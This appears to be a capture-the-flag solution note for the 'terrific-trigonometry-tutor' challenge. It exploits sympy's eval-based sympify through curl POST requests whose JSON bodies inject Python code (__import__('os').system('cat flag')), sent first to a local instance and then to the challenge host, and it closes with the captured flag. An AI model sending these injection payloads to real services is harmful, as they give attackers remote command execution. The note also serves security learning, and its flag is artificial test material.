# terrific-trigonometry-tutor

```sh
sudo docker build -t plaid-trig .
sudo docker run -dp 1337:1337 plaid-trig
```

sympy.simplify(expr[0]) -> sympify()

```
.. warning::
        Note that this function uses ``eval``, and thus shouldn't be used on
        unsanitized input.
```

```sh
# __import__("os").system("cat flag")

# example body: [["var","x"]]

curl http://0.0.0.0:1337/compute -H "Content-Type: application/json" --request POST -d '[["var","__import__(\"os\").system(\"cat flag\")"],["num","0"],["op","add"]]'

curl http://0.0.0.0:1337/compute -H "Content-Type: application/json" --request POST -d "[[\"var\",\"__import__('os').system('cat flag')\"]]"

curl http://0.0.0.0:1337/compute -H "Content-Type: application/json" --request POST -d "[[\"var\",\"__import__('os').system('cat flag')\"]]"


curl http://0.0.0.0:1337/compute -H "Content-Type: application/json" --request POST -d\
"[[\"var\",\"1 + __import__('os').system('cat flag')\"]]"


# ('__import__(\\'os\\').system(\\'cat flag\\')',)

curl http://0.0.0.0:1337/compute -H "Content-Type: application/json" --request POST -d\
"[[\"num\",\"('__import__(\\\'os\\\').system(\\\'cat flag\\')',)\"]]"


curl http://0.0.0.0:1337/compute -H "Content-Type: application/json" --request POST -d @./payload.json
# gets flag

curl http://ttt.chal.pwni.ng:1337/compute -H "Content-Type: application/json" --request POST -d @./payload.json

# pctf\{what\_be\_a\_pirate\_math3maticians\_favorite\_food?\_πzzarrrr\_\_\_s9oolow2OOhchoh7xthi5Rae5\}
```

`PCTF{what_be_a_pirate_math3maticians_favorite_food?_πzzarrrr___s9oolow2OOhchoh7xthi5Rae5}`
